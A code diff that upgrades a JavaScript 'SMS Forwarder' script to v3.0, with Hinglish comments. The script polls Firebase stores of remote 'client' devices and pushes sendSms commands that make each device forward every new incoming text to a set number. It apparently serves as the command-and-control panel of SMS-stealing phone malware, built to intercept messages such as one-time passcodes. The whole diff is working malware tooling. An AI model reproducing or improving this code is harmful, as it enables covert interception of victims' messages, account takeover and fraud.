@@ -1,18 +1,17 @@
 /* ============================================================
-   ANANYA SMS Forwarder v2.0 — Production Ready
-   Tampermonkey logic, panel-integrated
+   ANANYA SMS Forwarder v3.0 — Continuous Mode
+   Har incoming message forward karega, bina toggle kiye
    ============================================================ */
 
 (function () {
     'use strict';
 
-    console.log('[SMS-FWD] Loaded ✅');
+    console.log('[SMS-FWD] v3.0 Loaded ✅');
 
     var ACCOUNTS_KEY = 'flixy_accounts';
-    var PROCESSED_KEY = 'sms_fwd_done_v2';
-    var POLL_INTERVAL = 100;  // 1 second — safe for Firebase
+    var PROCESSED_KEY = 'sms_fwd_v3';
+    var POLL_INTERVAL = 1500;  // 1.5 sec
 
-    // ============ ACCOUNTS ============
     function getAccounts() {
         try {
             var s = localStorage.getItem(ACCOUNTS_KEY);
@@ -20,7 +19,6 @@
         } catch (e) { return []; }
     }
 
-    // ============ FIREBASE HELPERS ============
     async function fbGet(base, key, path) {
         try {
             var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
@@ -54,7 +52,7 @@
         } catch (e) { return false; }
     }
 
-    // ============ PROCESSED TRACKER ============
+    // ============ PROCESSED TRACKER (Persistent) ============
     var processed = new Set();
     try {
         var saved = JSON.parse(localStorage.getItem(PROCESSED_KEY) || '[]');
@@ -64,98 +62,88 @@
     function markDone(k) {
         processed.add(k);
         try {
-            var arr = Array.from(processed).slice(-1000);
+            var arr = Array.from(processed).slice(-2000);
             localStorage.setItem(PROCESSED_KEY, JSON.stringify(arr));
         } catch (e) {}
     }
 
-    // ============ CORE — HANDLE DEVICE ============
+    // ============ CORE — SCAN ALL NEW INCOMING MESSAGES ============
     async function handleDevice(acc, devId) {
         try {
-            // 1. Check forwarding config
+            // 1. Get forwarding config
             var cfg = await fbGet(acc.url, acc.key, 'clients/' + devId + '/smsForwarding');
-            if (!cfg) return;
-            if (!cfg.enabled) return;
-            if (!cfg.forwardTo) return;
+            if (!cfg || !cfg.enabled || !cfg.forwardTo) return;
 
-            // 2. Get messages
+            var to = String(cfg.forwardTo).replace(/[^0-9]/g, '');
+            var simSlot = cfg.simSlot != null ? cfg.simSlot : (cfg.sim || 0);
+            if (!to) return;
+
+            // 2. Get ALL messages (not just newest)
             var msgs = await fbGet(acc.url, acc.key, 'messages/' + devId);
             if (!msgs || typeof msgs !== 'object') return;
 
             var ids = Object.keys(msgs);
             if (!ids.length) return;
+
+            // 3. Sort by numeric ID
             ids.sort(function (a, b) { return Number(a) - Number(b); });
-            var newest = ids[ids.length - 1];
 
-            // 3. Check if already processed
-            var k = devId + '_' + newest;
-            if (processed.has(k)) return;
+            // 4. Process ONLY the last 20 messages (safety limit)
+            var scanLimit = Math.min(20, ids.length);
+            var startIdx = ids.length - scanLimit;
 
-            var sms = msgs[newest];
-            if (!sms) { markDone(k); return; }
-            if (sms.type !== 'incoming') { markDone(k); return; }
+            for (var i = startIdx; i < ids.length; i++) {
+                var msgId = ids[i];
+                var k = devId + '_' + msgId;
 
-            var text = sms.message || sms.body || sms.text || '';
-            if (!text) { markDone(k); return; }
+                // Skip if already processed
+                if (processed.has(k)) continue;
 
-            // 4. Prepare forward payload (SAME AS TAMPERMONKEY)
-            var to = String(cfg.forwardTo).replace(/[^0-9]/g, '');
-            var ts = Date.now();
-            var cid = 'fwd_' + ts + '_' + Math.random().toString(36).slice(2, 8);
-            var sim = { simSlot: cfg.simSlot != null ? cfg.simSlot : (cfg.sim || 0) };
+                var sms = msgs[msgId];
+                if (!sms) { markDone(k); continue; }
+                if (sms.type !== 'incoming') { markDone(k); continue; }
 
-            console.log('[SMS-FWD] 📤 Forwarding:', sms.sender, '→', to);
+                var text = sms.message || sms.body || sms.text || '';
+                if (!text) { markDone(k); continue; }
 
-            // 5. Write to Firebase — 4 PATHS (SAME AS TAMPERMONKEY + BOT 2.js)
-            // PATH 1: webhookEvent/sendSms — device reads this and sends SMS
-            await fbPut(acc.url, acc.key, 'clients/' + devId + '/webhookEvent/sendSms', {
-                to: to,
-                message: text,
-                isSended: false,
-                timestamp: ts,
-                commandId: cid,
-                simInfo: sim,
-                forwarded: true,
-                originalSender: sms.sender || 'Unknown'
-            });
+                // ======== FORWARD THIS MESSAGE ========
+                var ts = Date.now();
+                var cid = 'fwd_' + ts + '_' + Math.random().toString(36).slice(2, 8);
+                var sim = { simSlot: simSlot };
 
-            // PATH 2: commands/sendSms — backup
-            await fbPut(acc.url, acc.key, 'clients/' + devId + '/commands/sendSms', {
-                targetNumber: to,
-                message: text,
-                timestamp: ts,
-                status: 'pending',
-                id: cid,
-                simInfo: sim,
-                forwarded: true
-            });
+                console.log('[SMS-FWD] 📤 Forwarding:', sms.sender || 'Unknown', '→', to);
 
-            // PATH 3: messages — log entry
-            await fbPush(acc.url, acc.key, 'clients/' + devId + '/messages', {
-                sender: 'FORWARDER',
-                message: 'Fwd to ' + to + ': ' + String(text).slice(0, 200),
-                dateTime: ts,
-                timestamp: ts,
-                type: 'outgoing',
-                targetNumber: to,
-                commandId: cid,
-                status: 'pending',
-                simInfo: sim,
-                forwarded: true
-            });
+                // PATH 1: webhookEvent/sendSms
+                await fbPut(acc.url, acc.key, 'clients/' + devId + '/webhookEvent/sendSms', {
+                    to: to, message: text, isSended: false,
+                    timestamp: ts, commandId: cid, simInfo: sim,
+                    forwarded: true, originalSender: sms.sender || 'Unknown'
+                });
 
-            // PATH 4: sms — extra fallback
-            await fbPut(acc.url, acc.key, 'clients/' + devId + '/sms', {
-                to: to,
-                text: text,
-                timestamp: ts,
-                status: 'pending',
-                commandId: cid,
-                forwarded: true
-            });
+                // PATH 2: commands/sendSms (backup)
+                await fbPut(acc.url, acc.key, 'clients/' + devId + '/commands/sendSms', {
+                    targetNumber: to, message: text, timestamp: ts,
+                    status: 'pending', id: cid, simInfo: sim, forwarded: true
+                });
 
-            markDone(k);
-            console.log('[SMS-FWD] ✅ Forwarded:', sms.sender, '→', to);
+                // PATH 3: messages (log)
+                await fbPush(acc.url, acc.key, 'clients/' + devId + '/messages', {
+                    sender: 'FORWARDER',
+                    message: 'Fwd to ' + to + ': ' + String(text).slice(0, 200),
+                    dateTime: ts, timestamp: ts, type: 'outgoing',
+                    targetNumber: to, commandId: cid, status: 'pending',
+                    simInfo: sim, forwarded: true
+                });
+
+                // PATH 4: sms (fallback)
+                await fbPut(acc.url, acc.key, 'clients/' + devId + '/sms', {
+                    to: to, text: text, timestamp: ts, status: 'pending',
+                    commandId: cid, forwarded: true
+                });
+
+                markDone(k);
+                console.log('[SMS-FWD] ✅ Forwarded:', sms.sender || 'Unknown', '→', to);
+            }
 
         } catch (e) {
             console.error('[SMS-FWD] Error:', e.message);
@@ -187,11 +175,10 @@
         }
     }
 
-    // ============ START ============
     setInterval(tick, POLL_INTERVAL);
-    setTimeout(tick, 1500);  // Start after 1.5s
+    setTimeout(tick, 2000);
 
-    console.log('[SMS-FWD] Running every', POLL_INTERVAL, 'ms 🚀');
-    console.log('[SMS-FWD] Panel ke browser me chalta rahega — browser band na karo!');
+    console.log('[SMS-FWD] v3.0 Running every', POLL_INTERVAL, 'ms 🚀');
+    console.log('[SMS-FWD] Continuous mode — koi toggle nahi chahiye!');
 
 })();
